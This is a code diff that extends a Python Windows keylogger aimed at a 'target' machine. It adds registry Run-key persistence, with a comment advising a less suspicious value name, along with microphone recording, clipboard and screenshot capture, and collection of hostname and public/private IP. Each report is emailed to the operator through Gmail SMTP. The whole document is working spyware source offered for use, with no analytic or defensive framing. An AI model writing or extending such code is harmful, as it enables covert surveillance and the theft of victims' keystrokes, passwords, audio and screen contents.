@@ -6,11 +6,18 @@ import keyboard
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
+from email.mime.audio import MIMEAudio
 from email.mime.multipart import MIMEMultipart
-from threading import Semaphore, Timer, Event
+from threading import Semaphore, Timer, Event, Thread
 from PIL import ImageGrab, Image
 import win32gui
 import win32clipboard
+import winreg
+import socket
+import platform
+from requests import get
+import sounddevice as sd
+from scipy.io.wavfile import write
 from config import fromAddr, fromPswd
 
 
@@ -20,8 +27,41 @@ TAKE_SCREENSHOT_EVERY = SEND_REPORT_EVERY / 4
 EMAIL_ADDRESS = fromAddr
 EMAIL_PASSWORD = fromPswd
 
+
+class Persistence: #This will add the program (when turned into an exe) to the registry for it to launch everytime the machine is turned on
+    def __init__(self):
+        self.check_reg()
+    
+    def add_reg(self):
+        try:
+            addr = os.path.abspath(__file__)
+            reg_hkey = winreg.HKEY_CURRENT_USER
+            key = winreg.OpenKey(reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, 'Keylogger', 0, winreg.REG_SZ, addr) # Make sure to change this so that it doesn't look suspicious
+            winreg.CloseKey(key)
+        except:
+            pass
+
+    def check_reg(self):
+        try:
+            reg_hkey = winreg.HKEY_CURRENT_USER
+            key = winreg.OpenKey(reg_hkey, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
+            index = 0
+            while True:
+                v = winreg.EnumValue(key, index)
+                if 'Keylogger' not in v: # And this to waht you have changed above
+                    index += 1
+                    continue
+                return True
+        except:
+            winreg.CloseKey(key)
+            self.add_reg()
+
+
 class Keylogger:
-    def __init__(self, interval): #, scinterval):
+    def __init__(self, interval):
+        # We start persistence here
+        _ = Persistence()
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         # this is the string variable that contains the log of all 
@@ -33,9 +73,9 @@ class Keylogger:
         self.semaphore = Semaphore(0)
         # set the event that will block the screenshotting process while sending e-mail (else oncreasingly longer mail each loop)
         self.is_sending = Event()
-        # remove the screenshots folder to start over each time script is run
-        if os.path.exists('screenshots'):
-            shutil.rmtree('screenshots')
+        # remove the files folder to start over each time script is run
+        if os.path.exists('files'):
+            shutil.rmtree('files')
 
     def callback(self, event):
         """
@@ -88,13 +128,13 @@ class Keylogger:
             win32clipboard.CloseClipboard()
             
             # This adds it to self.log
-            self.log += f'\n\n[PASTE DATA] ~ {self.paste_data}\n'
+            self.log += f'\n\n[CLIPBOARD] ~ {self.paste_data}\n\n'
             
             # this sets self.paste_Data back to ''
             self.paste_data = '' 
 
         # If target presses backspace remove last character in self.log except if its a special key 
-        if name == '[BACKSPACE]' and self.log[-1] != ']':
+        if name == '[BACKSPACE]' and self.log[-1] != ']' and self.log != '':
             self.log = self.log[:-1]
         elif self.log.endswith(name) and name in ['[CTRL]', '[RIGHT_SHIFT]']:
             name = ''
@@ -112,19 +152,27 @@ class Keylogger:
         text = MIMEText(message)
         msg.attach(text)
 
-        # Attaches all images in screenshots and then removes them
-        for file in os.listdir('screenshots'):
-            filename = os.fsdecode(file)
-            if filename.endswith('png'):
-                img_c = Image.open(f'screenshots/{filename}')
-                img_c = img_c.resize((1920,1080), Image.LANCZOS)
-                img_c.save(f'screenshots/{filename}', optimize=True, quality=85)
+        # Attaches all images and audio in files and then removes them
+        if os.path.exists('files'):
+            for file in os.listdir('files'):
+                filename = os.fsdecode(file)
+                if filename.endswith('png'):
+                    # optimize images for sending 
+                    img_c = Image.open(f'files/{filename}')
+                    img_c = img_c.resize((1920,1080), Image.LANCZOS)
+                    img_c.save(f'files/{filename}', optimize=True, quality=85)
 
-                img_data = open(f'screenshots/{filename}', 'rb').read()
-                img = MIMEImage(img_data, name=filename)
-                msg.attach(img)
-                os.remove(f'screenshots/{filename}')
-        # os.rmdir('screenshots')
+                    img_data = open(f'files/{filename}', 'rb').read()
+                    img = MIMEImage(img_data, name=filename)
+                    msg.attach(img)
+                    os.remove(f'files/{filename}')
+
+                elif filename.endswith('wav'):
+                    audio_data = open(f'files/{filename}', 'rb').read()
+                    audio = MIMEAudio(audio_data, _subtype='wav', name=filename)
+                    msg.attach(audio)
+                    os.remove(f'files/{filename}')
+        # os.rmdir('files')
 
         # manages a connection to an SMTP server
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
@@ -142,26 +190,50 @@ class Keylogger:
         self.is_sending.clear() # Restarts the screenshotting process
 
 
+    def computer_info(self): # gets computer info 
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        
+        try:
+            public_ip = get("https://api.ipify.org").text
+            publicIP = "Public IP Address: " + public_ip + '\n'
+
+        except Exception:
+            publicIP = 'Couldn\'t get Public IP Address (most likely max query)' + '\n'
+
+        return f"{'#'*5} Target Machine Information {'#'*5} \n{publicIP}Processor: {platform.processor()} \nSystem: {platform.system()} {platform.version()} \nMachine: {platform.machine()} \nHostname: {hostname} \nPrivate IP Address: {IPAddr} \n{'#'*32} \n"
+
+
+    def microphone(self): # records microphone 
+        fs = 44100
+        seconds = SEND_REPORT_EVERY - 1
+
+        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+        sd.wait()
+
+        write('files/audio.wav', fs, myrecording)
+
+
     def s_screenshot(self, action): # simple screenshot (no loop)
         self.time = datetime.now()
         # print(f'{self.time.strftime("%D %T")} logs')
         self.filename = f'{self.time.strftime("%H-%M-%S")}-{action}.png'
-        self.filelocation = f'screenshots/{self.filename}'
+        self.filelocation = f'files/{self.filename}'
 
         self.screen = ImageGrab.grab()
         self.screen.save(self.filelocation)
 
 
-    def screenshot(self):
-        if not os.path.exists('screenshots'): # creates screenshot folder if it doesn't exist already
-            os.mkdir('screenshots')
+    def screenshot(self): # looping screenshots
+        if not os.path.exists('files'): # creates files folder if it doesn't exist already
+            os.mkdir('files')
         else:
             time.sleep(TAKE_SCREENSHOT_EVERY)
         
         self.time = datetime.now()
         # print(f'{self.time.strftime("%D %T")} logs')
         self.filename = f'{self.time.strftime("%H-%M-%S")}.png'
-        self.filelocation = f'screenshots/{self.filename}'
+        self.filelocation = f'files/{self.filename}'
         
         self.screen = ImageGrab.grab()
         self.screen.save(self.filelocation)
@@ -178,6 +250,8 @@ class Keylogger:
         It basically sends keylogs and resets `self.log` variable
         """
         if self.log:
+            # Add the computer info at the beginnig of the log string
+            self.log = self.computer_info() + self.log 
             # if there is something in log, report it
             print('[*] Sending email')
             self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
@@ -185,6 +259,9 @@ class Keylogger:
             # can print to a file, whatever you want
             # print(self.log)
         self.log = ""
+
+        mic = Thread(target=self.microphone) # start microphone recording
+        mic.start()
 
         Timer(interval=self.interval, function=self.report).start()
 
